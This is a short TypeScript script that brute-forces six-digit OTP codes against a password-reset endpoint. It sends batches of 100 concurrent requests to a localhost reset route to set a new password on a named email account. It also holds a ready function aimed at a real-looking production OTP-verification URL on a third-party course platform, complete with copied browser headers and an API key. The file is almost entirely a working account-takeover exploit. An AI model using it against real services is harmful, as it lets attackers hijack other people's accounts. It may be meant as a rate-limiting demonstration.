import axios from "axios";

async function sendRequest(otp: string) {
  let data = JSON.stringify({
    email: "anushka@gmail.com",
    otp: otp,
    newPassword: "zbckaskjc",
  });

  let config = {
    method: "POST",
    url: "http://localhost:3000/reset-password",
    headers: {
      Accept: "*/*",
      "User-Agent": "Thunder Client (https://www.thunderclient.com)",
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    console.log(response.data);
  } catch (error) {
    // console.error(error);
  }
}

async function sendRequestProduction(otp: string) {
  let config = {
    method: "get",
    maxBodyLength: Infinity,
    url:
      "https://harkiratapi.classx.co.in/get/otpverify?useremail=randomemail%40gmail.com&device_id=WebBrowser1725529083404nnmlbzt058c&mydeviceid=&mydeviceid2=&otp=" +
      otp,
    headers: {
      accept: "*/*",
      "accept-language": "en-US,en;q=0.9",
      "auth-key": "appxapi",
      "client-service": "Appx",
      "device-type": "",
      origin: "https://harkirat.classx.co.in",
      priority: "u=1, i",
      referer: "https://harkirat.classx.co.in/",
      "sec-ch-ua":
        '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      source: "website",
      "user-agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    },
  };

  await axios.request(config);
  try {
    const response = await axios.request(config);
    console.log(response.data);
  } catch (error) {
    // console.error(error);
  }
}

async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest((i + j).toString()));
    }
    /* `await Promise.all(promises);` is waiting for all the promises in the `promises` array to resolve. It ensures that all the asynchronous operations initiated by the `sendRequest` function calls inside the loop are completed before moving on to the next iteration of the loop. This helps in controlling the flow of execution and ensures that all requests are processed before proceeding further. */
    await Promise.all(promises);
  }
}

main();
